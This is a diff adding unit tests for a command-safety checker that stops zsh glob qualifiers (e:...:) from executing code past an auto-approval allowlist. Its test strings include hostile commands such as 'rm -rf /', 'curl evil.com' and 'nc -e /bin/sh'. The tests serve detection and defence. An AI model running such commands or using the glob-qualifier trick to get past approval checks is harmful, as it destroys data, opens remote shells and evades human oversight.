@@ -292,6 +292,27 @@ ls -la || echo "Failed"`
 			expect(containsDangerousSubstitution("ls =(sudo apt install malware)")).toBe(true)
 		})
 
+		it("detects zsh glob qualifiers with code execution (e:...:)", () => {
+			// Basic glob qualifier with command execution
+			expect(containsDangerousSubstitution("ls *(e:whoami:)")).toBe(true)
+
+			// Various glob patterns with code execution
+			expect(containsDangerousSubstitution("cat ?(e:rm -rf /:)")).toBe(true)
+			expect(containsDangerousSubstitution("echo +(e:sudo reboot:)")).toBe(true)
+			expect(containsDangerousSubstitution("rm @(e:curl evil.com:)")).toBe(true)
+			expect(containsDangerousSubstitution("touch !(e:nc -e /bin/sh:)")).toBe(true)
+
+			// Glob qualifiers in middle of command
+			expect(containsDangerousSubstitution("ls -la *(e:date:) test")).toBe(true)
+
+			// Multiple glob qualifiers
+			expect(containsDangerousSubstitution("cat *(e:whoami:) ?(e:pwd:)")).toBe(true)
+
+			// Glob qualifiers with complex commands
+			expect(containsDangerousSubstitution("ls *(e:open -a Calculator:)")).toBe(true)
+			expect(containsDangerousSubstitution("rm *(e:sudo apt install malware:)")).toBe(true)
+		})
+
 		it("does NOT flag safe parameter expansions", () => {
 			// Regular parameter expansions without dangerous operators
 			expect(containsDangerousSubstitution("echo ${var}")).toBe(false)
@@ -324,6 +345,12 @@ ls -la || echo "Failed"`
 			// Safe comparison operators
 			expect(containsDangerousSubstitution("if [ $a == $b ]; then")).toBe(false)
 			expect(containsDangerousSubstitution("test $x != $y")).toBe(false)
+
+			// Safe glob patterns without code execution qualifiers
+			expect(containsDangerousSubstitution("ls *")).toBe(false)
+			expect(containsDangerousSubstitution("rm *.txt")).toBe(false)
+			expect(containsDangerousSubstitution("cat ?(foo|bar)")).toBe(false)
+			expect(containsDangerousSubstitution("echo *(^/)")).toBe(false) // Safe glob qualifier (not e:)
 		})
 
 		it("handles complex combinations of dangerous patterns", () => {
@@ -349,6 +376,9 @@ ls -la || echo "Failed"`
 
 			// The new zsh process substitution exploit
 			expect(containsDangerousSubstitution("ls =(open -a Calculator)")).toBe(true)
+
+			// The zsh glob qualifier exploit
+			expect(containsDangerousSubstitution("ls *(e:whoami:)")).toBe(true)
 		})
 	})
 })
@@ -964,6 +994,25 @@ describe("Unified Command Decision Functions", () => {
 
 				// Combined with denied commands
 				expect(getCommandDecision("rm =(echo test)", ["echo"], ["rm"])).toBe("auto_deny")
+			})
+
+			it("prevents auto-approval for zsh glob qualifier exploits", () => {
+				// The zsh glob qualifier exploit with code execution
+				const globExploit = "ls *(e:whoami:)"
+				// Even though 'ls' might be allowed, the dangerous pattern prevents auto-approval
+				expect(getCommandDecision(globExploit, ["ls", "echo"], [])).toBe("ask_user")
+
+				// Various forms should all be blocked
+				expect(getCommandDecision("cat ?(e:rm -rf /:)", ["cat"], [])).toBe("ask_user")
+				expect(getCommandDecision("echo +(e:date:)", ["echo"], [])).toBe("ask_user")
+				expect(getCommandDecision("touch @(e:pwd:)", ["touch"], [])).toBe("ask_user")
+				expect(getCommandDecision("rm !(e:ls:)", ["rm"], [])).toBe("ask_user") // rm not in allowlist, has dangerous pattern
+
+				// Combined with denied commands
+				expect(getCommandDecision("rm *(e:echo test:)", ["echo"], ["rm"])).toBe("auto_deny")
+
+				// Multiple glob qualifiers
+				expect(getCommandDecision("ls *(e:whoami:) ?(e:pwd:)", ["ls"], [])).toBe("ask_user")
 			})
 		})
 
